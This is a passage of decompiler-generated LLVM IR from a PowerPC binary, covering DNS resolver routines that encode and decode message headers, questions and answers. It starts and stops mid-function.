  %v1_10012954 = call i32 @__asm_rlwinm(i32 %v6_1001294c, i32 0, i32 24, i32 24)
  %v0_10012958 = load i32, i32* %r10.global-to-local, align 4
  %v1_10012958 = mul i32 %v0_10012958, 4
  store i32 %v1_10012958, i32* %r10.global-to-local, align 4
  %v1_1001295c = call i32 @__asm_rlwinm(i32 %v3_10012938, i32 3, i32 25, i32 28)
  %v0_10012960 = load i32, i32* %r0.global-to-local, align 4
  %v2_10012960 = icmp ne i32 %v0_10012960, 0
  %v5_10012964 = zext i1 %v2_10012960 to i32
  %v2_10012968 = or i32 %v1_10012958, %v1_1001295c
  store i32 %v2_10012968, i32* %r10.global-to-local, align 4
  %v1_1001296c = add i32 %v1_10012954, 128
  %v0_10012970 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012970 = mul i32 %v0_10012970, 2
  store i32 %v1_10012970, i32* %r11.global-to-local, align 4
  %v2_10012974 = or i32 %v2_10012968, %v5_10012964
  store i32 %v2_10012974, i32* %r0.global-to-local, align 4
  %v2_10012978 = or i32 %v2_10012974, %v1_1001296c
  %v2_1001297c = or i32 %v2_10012978, %v1_10012970
  %v1_10012980 = trunc i32 %v2_1001297c to i8
  %v4_10012980 = add i32 %arg2, 2
  %v5_10012980 = inttoptr i32 %v4_10012980 to i8*
  store i8 %v1_10012980, i8* %v5_10012980, align 1
  %v1_10012984 = add i32 %tmp, 24
  %v2_10012984 = inttoptr i32 %v1_10012984 to i32*
  %v3_10012984 = load i32, i32* %v2_10012984, align 4
  %v1_10012988 = add i32 %tmp, 28
  %v2_10012988 = inttoptr i32 %v1_10012988 to i32*
  %v3_10012988 = load i32, i32* %v2_10012988, align 4
  store i32 %v3_10012988, i32* %r0.global-to-local, align 4
  %not.v2_1001298c = icmp eq i32 %v3_10012984, 0
  %v6_10012990 = sext i1 %not.v2_1001298c to i32
  %v1_10012994 = call i32 @__asm_rlwinm(i32 %v6_10012990, i32 0, i32 24, i32 24)
  %v1_10012998 = urem i32 %v3_10012988, 16
  store i32 %v1_10012998, i32* %r0.global-to-local, align 4
  %v1_1001299c = add i32 %v1_10012994, 128
  %v2_100129a0 = or i32 %v1_10012998, %v1_1001299c
  %v1_100129a4 = trunc i32 %v2_100129a0 to i8
  %v4_100129a4 = add i32 %arg2, 3
  %v5_100129a4 = inttoptr i32 %v4_100129a4 to i8*
  store i8 %v1_100129a4, i8* %v5_100129a4, align 1
  %v1_100129a8 = add i32 %tmp, 34
  %v2_100129a8 = inttoptr i32 %v1_100129a8 to i8*
  %v3_100129a8 = load i8, i8* %v2_100129a8, align 1
  %v4_100129a8 = zext i8 %v3_100129a8 to i32
  store i32 %v4_100129a8, i32* %r0.global-to-local, align 4
  %v4_100129ac = add i32 %arg2, 4
  %v5_100129ac = inttoptr i32 %v4_100129ac to i8*
  store i8 %v3_100129a8, i8* %v5_100129ac, align 1
  %v1_100129b0 = add i32 %tmp, 32
  %v2_100129b0 = inttoptr i32 %v1_100129b0 to i32*
  %v3_100129b0 = load i32, i32* %v2_100129b0, align 4
  store i32 %v3_100129b0, i32* %r0.global-to-local, align 4
  %v1_100129b4 = trunc i32 %v3_100129b0 to i8
  %v4_100129b4 = add i32 %arg2, 5
  %v5_100129b4 = inttoptr i32 %v4_100129b4 to i8*
  store i8 %v1_100129b4, i8* %v5_100129b4, align 1
  %v1_100129b8 = add i32 %tmp, 38
  %v2_100129b8 = inttoptr i32 %v1_100129b8 to i8*
  %v3_100129b8 = load i8, i8* %v2_100129b8, align 1
  %v4_100129b8 = zext i8 %v3_100129b8 to i32
  store i32 %v4_100129b8, i32* %r0.global-to-local, align 4
  %v4_100129bc = add i32 %arg2, 6
  %v5_100129bc = inttoptr i32 %v4_100129bc to i8*
  store i8 %v3_100129b8, i8* %v5_100129bc, align 1
  %v1_100129c0 = add i32 %tmp, 36
  %v2_100129c0 = inttoptr i32 %v1_100129c0 to i32*
  %v3_100129c0 = load i32, i32* %v2_100129c0, align 4
  store i32 %v3_100129c0, i32* %r0.global-to-local, align 4
  %v1_100129c4 = trunc i32 %v3_100129c0 to i8
  %v4_100129c4 = add i32 %arg2, 7
  %v5_100129c4 = inttoptr i32 %v4_100129c4 to i8*
  store i8 %v1_100129c4, i8* %v5_100129c4, align 1
  %v1_100129c8 = add i32 %tmp, 42
  %v2_100129c8 = inttoptr i32 %v1_100129c8 to i8*
  %v3_100129c8 = load i8, i8* %v2_100129c8, align 1
  %v4_100129c8 = zext i8 %v3_100129c8 to i32
  store i32 %v4_100129c8, i32* %r0.global-to-local, align 4
  %v4_100129cc = add i32 %arg2, 8
  %v5_100129cc = inttoptr i32 %v4_100129cc to i8*
  store i8 %v3_100129c8, i8* %v5_100129cc, align 1
  %v1_100129d0 = add i32 %tmp, 40
  %v2_100129d0 = inttoptr i32 %v1_100129d0 to i32*
  %v3_100129d0 = load i32, i32* %v2_100129d0, align 4
  store i32 %v3_100129d0, i32* %r0.global-to-local, align 4
  %v1_100129d4 = trunc i32 %v3_100129d0 to i8
  %v4_100129d4 = add i32 %arg2, 9
  %v5_100129d4 = inttoptr i32 %v4_100129d4 to i8*
  store i8 %v1_100129d4, i8* %v5_100129d4, align 1
  %v1_100129d8 = add i32 %tmp, 46
  %v2_100129d8 = inttoptr i32 %v1_100129d8 to i8*
  %v3_100129d8 = load i8, i8* %v2_100129d8, align 1
  %v4_100129d8 = zext i8 %v3_100129d8 to i32
  store i32 %v4_100129d8, i32* %r0.global-to-local, align 4
  %v4_100129dc = add i32 %arg2, 10
  %v5_100129dc = inttoptr i32 %v4_100129dc to i8*
  store i8 %v3_100129d8, i8* %v5_100129dc, align 1
  %v1_100129e0 = add i32 %tmp, 44
  %v2_100129e0 = inttoptr i32 %v1_100129e0 to i32*
  %v3_100129e0 = load i32, i32* %v2_100129e0, align 4
  store i32 %v3_100129e0, i32* %r0.global-to-local, align 4
  %v1_100129e4 = trunc i32 %v3_100129e0 to i8
  %v4_100129e4 = add i32 %arg2, 11
  %v5_100129e4 = inttoptr i32 %v4_100129e4 to i8*
  store i8 %v1_100129e4, i8* %v5_100129e4, align 1
  %v0_100129e8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100129e8

dec_label_pc_100129e8:                            ; preds = %entry, %dec_label_pc_10012910
  %v0_100129e8 = phi i32 [ -1, %entry ], [ %v0_100129e8.pre, %dec_label_pc_10012910 ]
  ret i32 %v0_100129e8

; uselistorder directives
  uselistorder i32 %v1_10012998, { 1, 0 }
  uselistorder i32 %v1_10012970, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder i32 38, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100129e8, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_100129f0 = load i8, i8* %arg1, align 1
  %v4_100129f0 = zext i8 %v3_100129f0 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_100129f8 = add i32 %tmp, 1
  %v3_100129f8 = inttoptr i32 %v2_100129f8 to i8*
  %v4_100129f8 = load i8, i8* %v3_100129f8, align 1
  %v5_100129f8 = zext i8 %v4_100129f8 to i32
  %v1_10012a00 = mul nuw nsw i32 %v4_100129f0, 256
  %v2_10012a04 = or i32 %v5_100129f8, %v1_10012a00
  %v2_10012a08 = inttoptr i32 %arg2 to i32*
  store i32 %v2_10012a04, i32* %v2_10012a08, align 4
  %v0_10012a0c = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a0c = add i32 %v0_10012a0c, 2
  %v2_10012a0c = inttoptr i32 %v1_10012a0c to i8*
  %v3_10012a0c = load i8, i8* %v2_10012a0c, align 1
  %v4_10012a0c = zext i8 %v3_10012a0c to i32
  %v1_10012a10 = call i32 @__asm_rlwinm(i32 %v4_10012a0c, i32 25, i32 31, i32 31)
  %v2_10012a14 = add i32 %arg2, 4
  %v3_10012a14 = inttoptr i32 %v2_10012a14 to i32*
  store i32 %v1_10012a10, i32* %v3_10012a14, align 4
  %v0_10012a18 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a18 = add i32 %v0_10012a18, 2
  %v2_10012a18 = inttoptr i32 %v1_10012a18 to i8*
  %v3_10012a18 = load i8, i8* %v2_10012a18, align 1
  %v4_10012a18 = zext i8 %v3_10012a18 to i32
  %v1_10012a1c = call i32 @__asm_rlwinm(i32 %v4_10012a18, i32 29, i32 28, i32 31)
  %v2_10012a20 = add i32 %arg2, 8
  %v3_10012a20 = inttoptr i32 %v2_10012a20 to i32*
  store i32 %v1_10012a1c, i32* %v3_10012a20, align 4
  %v0_10012a24 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a24 = add i32 %v0_10012a24, 2
  %v2_10012a24 = inttoptr i32 %v1_10012a24 to i8*
  %v3_10012a24 = load i8, i8* %v2_10012a24, align 1
  %v4_10012a24 = zext i8 %v3_10012a24 to i32
  %v1_10012a28 = call i32 @__asm_rlwinm(i32 %v4_10012a24, i32 30, i32 31, i32 31)
  %v2_10012a2c = add i32 %arg2, 12
  %v3_10012a2c = inttoptr i32 %v2_10012a2c to i32*
  store i32 %v1_10012a28, i32* %v3_10012a2c, align 4
  %v0_10012a30 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a30 = add i32 %v0_10012a30, 2
  %v2_10012a30 = inttoptr i32 %v1_10012a30 to i8*
  %v3_10012a30 = load i8, i8* %v2_10012a30, align 1
  %v4_10012a30 = zext i8 %v3_10012a30 to i32
  %v1_10012a34 = call i32 @__asm_rlwinm(i32 %v4_10012a30, i32 31, i32 31, i32 31)
  %v2_10012a38 = add i32 %arg2, 16
  %v3_10012a38 = inttoptr i32 %v2_10012a38 to i32*
  store i32 %v1_10012a34, i32* %v3_10012a38, align 4
  %v0_10012a3c = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a3c = add i32 %v0_10012a3c, 2
  %v2_10012a3c = inttoptr i32 %v1_10012a3c to i8*
  %v3_10012a3c = load i8, i8* %v2_10012a3c, align 1
  %tmp1 = urem i8 %v3_10012a3c, 2
  %v1_10012a40 = zext i8 %tmp1 to i32
  %v2_10012a44 = add i32 %arg2, 20
  %v3_10012a44 = inttoptr i32 %v2_10012a44 to i32*
  store i32 %v1_10012a40, i32* %v3_10012a44, align 4
  %v0_10012a48 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a48 = add i32 %v0_10012a48, 3
  %v2_10012a48 = inttoptr i32 %v1_10012a48 to i8*
  %v3_10012a48 = load i8, i8* %v2_10012a48, align 1
  %v4_10012a48 = zext i8 %v3_10012a48 to i32
  %v1_10012a4c = call i32 @__asm_rlwinm(i32 %v4_10012a48, i32 25, i32 31, i32 31)
  %v2_10012a50 = add i32 %arg2, 24
  %v3_10012a50 = inttoptr i32 %v2_10012a50 to i32*
  store i32 %v1_10012a4c, i32* %v3_10012a50, align 4
  %v0_10012a54 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a54 = add i32 %v0_10012a54, 3
  %v2_10012a54 = inttoptr i32 %v1_10012a54 to i8*
  %v3_10012a54 = load i8, i8* %v2_10012a54, align 1
  %tmp2 = urem i8 %v3_10012a54, 16
  %v1_10012a58 = zext i8 %tmp2 to i32
  %v2_10012a5c = add i32 %arg2, 28
  %v3_10012a5c = inttoptr i32 %v2_10012a5c to i32*
  store i32 %v1_10012a58, i32* %v3_10012a5c, align 4
  %v0_10012a60 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a60 = add i32 %v0_10012a60, 4
  %v2_10012a60 = inttoptr i32 %v1_10012a60 to i8*
  %v3_10012a60 = load i8, i8* %v2_10012a60, align 1
  %v4_10012a60 = zext i8 %v3_10012a60 to i32
  %v1_10012a64 = add i32 %v0_10012a60, 5
  %v2_10012a64 = inttoptr i32 %v1_10012a64 to i8*
  %v3_10012a64 = load i8, i8* %v2_10012a64, align 1
  %v4_10012a64 = zext i8 %v3_10012a64 to i32
  %v1_10012a68 = mul nuw nsw i32 %v4_10012a60, 256
  %v2_10012a6c = or i32 %v4_10012a64, %v1_10012a68
  %v2_10012a70 = add i32 %arg2, 32
  %v3_10012a70 = inttoptr i32 %v2_10012a70 to i32*
  store i32 %v2_10012a6c, i32* %v3_10012a70, align 4
  %v0_10012a74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a74 = add i32 %v0_10012a74, 6
  %v2_10012a74 = inttoptr i32 %v1_10012a74 to i8*
  %v3_10012a74 = load i8, i8* %v2_10012a74, align 1
  %v4_10012a74 = zext i8 %v3_10012a74 to i32
  %v1_10012a78 = add i32 %v0_10012a74, 7
  %v2_10012a78 = inttoptr i32 %v1_10012a78 to i8*
  %v3_10012a78 = load i8, i8* %v2_10012a78, align 1
  %v4_10012a78 = zext i8 %v3_10012a78 to i32
  %v1_10012a7c = mul nuw nsw i32 %v4_10012a74, 256
  %v2_10012a80 = or i32 %v4_10012a78, %v1_10012a7c
  %v2_10012a84 = add i32 %arg2, 36
  %v3_10012a84 = inttoptr i32 %v2_10012a84 to i32*
  store i32 %v2_10012a80, i32* %v3_10012a84, align 4
  %v0_10012a88 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a88 = add i32 %v0_10012a88, 8
  %v2_10012a88 = inttoptr i32 %v1_10012a88 to i8*
  %v3_10012a88 = load i8, i8* %v2_10012a88, align 1
  %v4_10012a88 = zext i8 %v3_10012a88 to i32
  %v1_10012a8c = add i32 %v0_10012a88, 9
  %v2_10012a8c = inttoptr i32 %v1_10012a8c to i8*
  %v3_10012a8c = load i8, i8* %v2_10012a8c, align 1
  %v4_10012a8c = zext i8 %v3_10012a8c to i32
  %v1_10012a90 = mul nuw nsw i32 %v4_10012a88, 256
  %v2_10012a94 = or i32 %v4_10012a8c, %v1_10012a90
  %v2_10012a98 = add i32 %arg2, 40
  %v3_10012a98 = inttoptr i32 %v2_10012a98 to i32*
  store i32 %v2_10012a94, i32* %v3_10012a98, align 4
  %v0_10012a9c = load i32, i32* %r9.global-to-local, align 4
  %v1_10012a9c = add i32 %v0_10012a9c, 10
  %v2_10012a9c = inttoptr i32 %v1_10012a9c to i8*
  %v3_10012a9c = load i8, i8* %v2_10012a9c, align 1
  %v4_10012a9c = zext i8 %v3_10012a9c to i32
  %v1_10012aa0 = add i32 %v0_10012a9c, 11
  %v2_10012aa0 = inttoptr i32 %v1_10012aa0 to i8*
  %v3_10012aa0 = load i8, i8* %v2_10012aa0, align 1
  %v4_10012aa0 = zext i8 %v3_10012aa0 to i32
  store i32 %v4_10012aa0, i32* %r9.global-to-local, align 4
  %v1_10012aa4 = mul nuw nsw i32 %v4_10012a9c, 256
  %v2_10012aa8 = or i32 %v4_10012aa0, %v1_10012aa4
  %v2_10012aac = add i32 %arg2, 44
  %v3_10012aac = inttoptr i32 %v2_10012aac to i32*
  store i32 %v2_10012aa8, i32* %v3_10012aac, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 9, 10, 7, 8, 15, 6, 14, 12, 0, 11, 1, 2, 3, 4, 5, 13 }
  uselistorder i32 11, { 13, 14, 6, 16, 5, 3, 7, 0, 1, 8, 9, 10, 11, 12, 2, 4, 15 }
  uselistorder i32 40, { 8, 9, 1, 11, 10, 0, 2, 3, 4, 5, 6, 7, 12 }
  uselistorder i32 7, { 9, 10, 2, 5, 6, 7, 8, 0, 1, 3, 4, 11, 12 }
  uselistorder i32 5, { 16, 17, 7, 8, 9, 2, 3, 10, 0, 11, 12, 1, 13, 14, 4, 5, 15, 6, 18 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 10, 9, 5, 6, 7, 8, 0, 1, 2, 11, 12, 3, 4, 13, 14, 15, 16 }
  uselistorder i32 28, { 34, 35, 36, 37, 4, 5, 10, 38, 16, 48, 42, 0, 43, 44, 45, 6, 7, 17, 12, 11, 39, 40, 18, 19, 20, 21, 22, 23, 26, 24, 25, 1, 27, 49, 41, 13, 14, 15, 28, 2, 3, 29, 8, 9, 30, 31, 32, 33, 46, 47 }
  uselistorder i32 29, { 9, 12, 13, 10, 11, 6, 2, 15, 3, 16, 0, 1, 17, 18, 7, 8, 21, 22, 19, 20, 4, 5, 14 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10012ad0 = load i32, i32* %arg1, align 4
  store i32 %v2_10012ad0, i32* %r3.global-to-local, align 4
  store i32 268511960, i32* @lr, align 4
  %v1_10012ad4 = inttoptr i32 %v2_10012ad0 to i8*
  %v2_10012ad4 = call i32 @__encode_dotted(i8* %v1_10012ad4)
  store i32 %v2_10012ad4, i32* %r3.global-to-local, align 4
  %v1_10012ad8 = icmp slt i32 %v2_10012ad4, 0
  %v1_10012adc = load i32, i32* @r29, align 4
  %v2_10012adc = sub i32 %v1_10012adc, %v2_10012ad4
  store i32 %v2_10012adc, i32* @r29, align 4
  br i1 %v1_10012ad8, label %dec_label_pc_10012b1c, label %dec_label_pc_10012ae8

dec_label_pc_10012ae8:                            ; preds = %entry
  %v2_10012ae0 = icmp sgt i32 %v2_10012adc, 3
  %v0_10012ae8 = load i32, i32* @r30, align 4
  %v2_10012ae8 = add i32 %v0_10012ae8, %v2_10012ad4
  store i32 %v2_10012ae8, i32* %r9.global-to-local, align 4
  br i1 %v2_10012ae0, label %dec_label_pc_10012af8, label %dec_label_pc_10012af0

dec_label_pc_10012af0:                            ; preds = %dec_label_pc_10012ae8
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012b1c

dec_label_pc_10012af8:                            ; preds = %dec_label_pc_10012ae8
  %v0_10012af8 = load i32, i32* @r31, align 4
  %v1_10012af8 = add i32 %v0_10012af8, 6
  %v2_10012af8 = inttoptr i32 %v1_10012af8 to i8*
  %v3_10012af8 = load i8, i8* %v2_10012af8, align 1
  %v5_10012afc = inttoptr i32 %v2_10012ae8 to i8*
  store i8 %v3_10012af8, i8* %v5_10012afc, align 1
  %v0_10012b00 = load i32, i32* %r3.global-to-local, align 4
  %v1_10012b00 = add i32 %v0_10012b00, 4
  store i32 %v1_10012b00, i32* %r3.global-to-local, align 4
  %v0_10012b04 = load i32, i32* @r31, align 4
  %v1_10012b04 = add i32 %v0_10012b04, 4
  %v2_10012b04 = inttoptr i32 %v1_10012b04 to i32*
  %v3_10012b04 = load i32, i32* %v2_10012b04, align 4
  %v1_10012b08 = trunc i32 %v3_10012b04 to i8
  %v2_10012b08 = load i32, i32* %r9.global-to-local, align 4
  %v3_10012b08 = add i32 %v2_10012b08, 1
  %v4_10012b08 = inttoptr i32 %v3_10012b08 to i8*
  store i8 %v1_10012b08, i8* %v4_10012b08, align 1
  %v0_10012b0c = load i32, i32* @r31, align 4
  %v1_10012b0c = add i32 %v0_10012b0c, 10
  %v2_10012b0c = inttoptr i32 %v1_10012b0c to i8*
  %v3_10012b0c = load i8, i8* %v2_10012b0c, align 1
  %v2_10012b10 = load i32, i32* %r9.global-to-local, align 4
  %v3_10012b10 = add i32 %v2_10012b10, 2
  %v4_10012b10 = inttoptr i32 %v3_10012b10 to i8*
  store i8 %v3_10012b0c, i8* %v4_10012b10, align 1
  %v0_10012b14 = load i32, i32* @r31, align 4
  %v1_10012b14 = add i32 %v0_10012b14, 8
  %v2_10012b14 = inttoptr i32 %v1_10012b14 to i32*
  %v3_10012b14 = load i32, i32* %v2_10012b14, align 4
  %v1_10012b18 = trunc i32 %v3_10012b14 to i8
  %v2_10012b18 = load i32, i32* %r9.global-to-local, align 4
  %v3_10012b18 = add i32 %v2_10012b18, 3
  %v4_10012b18 = inttoptr i32 %v3_10012b18 to i8*
  store i8 %v1_10012b18, i8* %v4_10012b18, align 1
  %v0_10012b2c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10012b1c

dec_label_pc_10012b1c:                            ; preds = %entry, %dec_label_pc_10012af0, %dec_label_pc_10012af8
  %v0_10012b2c = phi i32 [ %v2_10012ad4, %entry ], [ -1, %dec_label_pc_10012af0 ], [ %v0_10012b2c.pre, %dec_label_pc_10012af8 ]
  ret i32 %v0_10012b2c

; uselistorder directives
  uselistorder i32 %v2_10012ad4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_10012b1c, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268512064, i32* @lr, align 4
  %v0_10012b3c = call i32 @__length_dotted()
  %v1_10012b40 = icmp slt i32 %v0_10012b3c, 0
  br i1 %v1_10012b40, label %dec_label_pc_10012b4c, label %dec_label_pc_10012b48

dec_label_pc_10012b48:                            ; preds = %entry
  %v1_10012b48 = add i32 %v0_10012b3c, 4
  br label %dec_label_pc_10012b4c

dec_label_pc_10012b4c:                            ; preds = %entry, %dec_label_pc_10012b48
  %v0_10012b58 = phi i32 [ %v0_10012b3c, %entry ], [ %v1_10012b48, %dec_label_pc_10012b48 ]
  ret i32 %v0_10012b58

; uselistorder directives
  uselistorder label %dec_label_pc_10012b4c, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_10012b60 = load i32, i32* @lr, align 4
  store i32 %v0_10012b60, i32* %r0.global-to-local, align 4
  %v2_10012b68 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_10012b68, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268512140, i32* @lr, align 4
  %v2_10012b88 = call i32 @__decode_dotted(i32 %v2_10012b68, i32 256)
  store i32 %v2_10012b88, i32* @r27, align 4
  %v1_10012b8c = icmp slt i32 %v2_10012b88, 0
  %v0_10012b90 = load i32, i32* @r28, align 4
  %v2_10012b90 = add i32 %v0_10012b90, %v2_10012b88
  store i32 %v2_10012b90, i32* @r28, align 4
  %v1_10012b94 = load i32, i32* @r29, align 4
  %v2_10012b94 = sub i32 %v1_10012b94, %v2_10012b90
  %v1_10012b98 = add i32 %v2_10012b94, -10
  br i1 %v1_10012b8c, label %dec_label_pc_10012c54, label %dec_label_pc_10012ba4

dec_label_pc_10012ba4:                            ; preds = %entry
  %v0_10012ba8 = load i32, i32* @r26, align 4
  %v2_10012ba8 = add i32 %v0_10012ba8, %v2_10012b90
  store i32 %v2_10012ba8, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_10012b98, -1
  br i1 %tmp6, label %dec_label_pc_10012bb8, label %dec_label_pc_10012bb0

dec_label_pc_10012bb0:                            ; preds = %dec_label_pc_10012ba4
  store i32 %v1_10012b98, i32* @r27, align 4
  br label %dec_label_pc_10012c54

dec_label_pc_10012bb8:                            ; preds = %dec_label_pc_10012ba4
  store i32 268512188, i32* @lr, align 4
  %v1_10012bb8 = call i32 @__GI_strdup(i32 %v2_10012b68)
  %v0_10012bbc = load i32, i32* @r30, align 4
  %v1_10012bbc = add i32 %v0_10012bbc, 2
  store i32 %v1_10012bbc, i32* %r8.global-to-local, align 4
  %v1_10012bc0 = load i32, i32* @r31, align 4
  %v2_10012bc0 = inttoptr i32 %v1_10012bc0 to i32*
  store i32 %v1_10012bb8, i32* %v2_10012bc0, align 4
  %v0_10012bc4 = load i32, i32* %r8.global-to-local, align 4
  %v1_10012bc4 = add i32 %v0_10012bc4, 2
  store i32 %v1_10012bc4, i32* %r10.global-to-local, align 4
  %v0_10012bc8 = load i32, i32* @r30, align 4
  %v1_10012bc8 = add i32 %v0_10012bc8, 10
  store i32 %v1_10012bc8, i32* %r6.global-to-local, align 4
  %v0_10012bcc = load i32, i32* @r26, align 4
  %v1_10012bcc = load i32, i32* @r28, align 4
  %v2_10012bcc = add i32 %v1_10012bcc, %v0_10012bcc
  %v3_10012bcc = inttoptr i32 %v2_10012bcc to i8*
  %v4_10012bcc = load i8, i8* %v3_10012bcc, align 1
  %v5_10012bcc = zext i8 %v4_10012bcc to i32
  store i32 %v5_10012bcc, i32* %r0.global-to-local, align 4
  %v1_10012bd0 = add i32 %v0_10012bc8, 1
  %v2_10012bd0 = inttoptr i32 %v1_10012bd0 to i8*
  %v3_10012bd0 = load i8, i8* %v2_10012bd0, align 1
  %v4_10012bd0 = zext i8 %v3_10012bd0 to i32
  store i32 %v4_10012bd0, i32* %r9.global-to-local, align 4
  %v1_10012bd4 = mul nuw nsw i32 %v5_10012bcc, 256
  %v2_10012bd8 = or i32 %v4_10012bd0, %v1_10012bd4
  store i32 %v2_10012bd8, i32* %r0.global-to-local, align 4
  %v1_10012bdc = load i32, i32* @r31, align 4
  %v2_10012bdc = add i32 %v1_10012bdc, 4
  %v3_10012bdc = inttoptr i32 %v2_10012bdc to i32*
  store i32 %v2_10012bd8, i32* %v3_10012bdc, align 4
  %v0_10012be0 = load i32, i32* @r30, align 4
  %v1_10012be0 = add i32 %v0_10012be0, 2
  %v2_10012be0 = inttoptr i32 %v1_10012be0 to i8*
  %v3_10012be0 = load i8, i8* %v2_10012be0, align 1
  %v4_10012be0 = zext i8 %v3_10012be0 to i32
  store i32 %v4_10012be0, i32* %r0.global-to-local, align 4
  %v0_10012be4 = load i32, i32* %r8.global-to-local, align 4
  %v1_10012be4 = add i32 %v0_10012be4, 1
  %v2_10012be4 = inttoptr i32 %v1_10012be4 to i8*
  %v3_10012be4 = load i8, i8* %v2_10012be4, align 1
  %v4_10012be4 = zext i8 %v3_10012be4 to i32
  store i32 %v4_10012be4, i32* %r9.global-to-local, align 4
  %v1_10012be8 = mul nuw nsw i32 %v4_10012be0, 256
  %v2_10012bec = or i32 %v4_10012be4, %v1_10012be8
  store i32 %v2_10012bec, i32* %r0.global-to-local, align 4
  %v1_10012bf0 = load i32, i32* @r31, align 4
  %v2_10012bf0 = add i32 %v1_10012bf0, 8
  %v3_10012bf0 = inttoptr i32 %v2_10012bf0 to i32*
  store i32 %v2_10012bec, i32* %v3_10012bf0, align 4
  %v0_10012bf4 = load i32, i32* %r8.global-to-local, align 4
  %v1_10012bf4 = add i32 %v0_10012bf4, 2
  %v2_10012bf4 = inttoptr i32 %v1_10012bf4 to i8*
  %v3_10012bf4 = load i8, i8* %v2_10012bf4, align 1
  %v4_10012bf4 = zext i8 %v3_10012bf4 to i32
  store i32 %v4_10012bf4, i32* %r0.global-to-local, align 4
  %v0_10012bf8 = load i32, i32* %r10.global-to-local, align 4
  %v1_10012bf8 = add i32 %v0_10012bf8, 1
  %v2_10012bf8 = inttoptr i32 %v1_10012bf8 to i8*
  %v3_10012bf8 = load i8, i8* %v2_10012bf8, align 1
  %v4_10012bf8 = zext i8 %v3_10012bf8 to i32
  store i32 %v4_10012bf8, i32* %r11.global-to-local, align 4
  %v1_10012bfc = add i32 %v0_10012bf8, 3
  %v2_10012bfc = inttoptr i32 %v1_10012bfc to i8*
  %v3_10012bfc = load i8, i8* %v2_10012bfc, align 1
  %v4_10012bfc = zext i8 %v3_10012bfc to i32
  %v1_10012c00 = mul nuw i32 %v4_10012bf4, 16777216
  store i32 %v1_10012c00, i32* %r0.global-to-local, align 4
  %v1_10012c04 = add i32 %v0_10012bf8, 2
  %v2_10012c04 = inttoptr i32 %v1_10012c04 to i8*
  %v3_10012c04 = load i8, i8* %v2_10012c04, align 1
  %v4_10012c04 = zext i8 %v3_10012c04 to i32
  %v1_10012c08 = mul nuw nsw i32 %v4_10012bf8, 65536
  %v2_10012c0c = or i32 %v1_10012c08, %v1_10012c00
  %v0_10012c10 = load i32, i32* @r28, align 4
  %v1_10012c10 = add i32 %v0_10012c10, 10
  store i32 %v1_10012c10, i32* %r11.global-to-local, align 4
  %v2_10012c14 = or i32 %v2_10012c0c, %v4_10012bfc
  store i32 %v2_10012c14, i32* %r0.global-to-local, align 4
  %v1_10012c18 = mul nuw nsw i32 %v4_10012c04, 256
  %v2_10012c1c = or i32 %v1_10012c18, %v2_10012c14
  store i32 %v2_10012c1c, i32* %r9.global-to-local, align 4
  %v1_10012c20 = load i32, i32* @r31, align 4
  %v2_10012c20 = add i32 %v1_10012c20, 12
  %v3_10012c20 = inttoptr i32 %v2_10012c20 to i32*
  store i32 %v2_10012c1c, i32* %v3_10012c20, align 4
  %v0_10012c24 = load i32, i32* %r8.global-to-local, align 4
  %v1_10012c24 = add i32 %v0_10012c24, 6
  %v2_10012c24 = inttoptr i32 %v1_10012c24 to i8*
  %v3_10012c24 = load i8, i8* %v2_10012c24, align 1
  %v4_10012c24 = zext i8 %v3_10012c24 to i32
  store i32 %v4_10012c24, i32* %r9.global-to-local, align 4
  %v0_10012c28 = load i32, i32* @r30, align 4
  %v1_10012c28 = add i32 %v0_10012c28, 9
